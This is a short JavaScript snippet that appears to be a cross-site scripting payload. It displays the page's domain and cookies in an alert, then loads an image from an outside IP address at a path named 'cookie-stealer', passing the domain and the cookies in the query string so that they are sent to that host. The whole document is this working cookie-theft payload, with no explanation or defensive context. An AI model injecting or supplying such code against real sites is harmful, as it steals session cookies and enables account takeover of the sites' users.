  alert(document.domain + "\n" + document.cookie);
  var img = new Image();
  img.src = 'http://49.13.194.218/cookie-stealer?domain=' + encodeURIComponent(document.domain) + '&cookie=' + encodeURIComponent(document.cookie);
